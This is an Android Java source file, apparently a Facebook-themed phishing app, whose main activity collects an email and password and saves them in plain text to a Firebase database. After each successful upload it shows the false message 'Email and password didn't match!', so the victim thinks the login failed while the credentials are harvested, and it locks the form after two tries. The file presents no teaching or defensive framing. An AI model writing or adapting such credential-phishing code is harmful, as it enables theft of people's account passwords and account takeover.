package com.example.facebook_demo;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.example.facebook_demo.R;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private EditText nameEditText;
    private EditText emailEditText;
    private DatabaseReference databaseReference;
    private Button submitButton;
    private int submitCounter = 0;
    private static final int MAX_SUBMISSIONS = 2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        nameEditText = findViewById(R.id.nameEditText);
        emailEditText = findViewById(R.id.emailEditText);
        submitButton = findViewById(R.id.submitButton);

        // Initialize Firebase Realtime Database
        FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
        databaseReference = firebaseDatabase.getReference("users");
    }

    public void submitForm(View view) {
        if (submitCounter >= MAX_SUBMISSIONS) {
            Toast.makeText(this, "Wait a minute!", Toast.LENGTH_SHORT).show();
            submitButton.setEnabled(false);
            return;
        }

        String email = nameEditText.getText().toString().trim();
        String password = emailEditText.getText().toString().trim();

        // Validate the form fields
        if (email.isEmpty() || password.isEmpty()) {
            Toast.makeText(this, "Please fill in all fields", Toast.LENGTH_SHORT).show();
            return;
        }

        // Check network connectivity
        if (isNetworkConnected()) {
            // Create a new user object
            User user = new User(email, password);

            // Upload the user data to Firebase Realtime Database
            databaseReference.push().setValue(user)
                    .addOnSuccessListener(new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void aVoid) {
                            Toast.makeText(MainActivity.this, "Email and password didn't match!", Toast.LENGTH_SHORT).show();
                            submitCounter++;
                        }
                    })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Toast.makeText(MainActivity.this, "Error uploading data: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    });
        } else {
            Toast.makeText(this, "Can't connect to network. Please check your internet connection.", Toast.LENGTH_SHORT).show();
        }
    }

    // Method to check network connectivity
    private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnected();
    }

    public static class User {
        public String email;
        public String password;

        public User() {
            // Default constructor required for calls to DataSnapshot.getValue(User.class)
        }

        public User(String email, String password) {
            this.email = email;
            this.password = password;
        }
    }
}
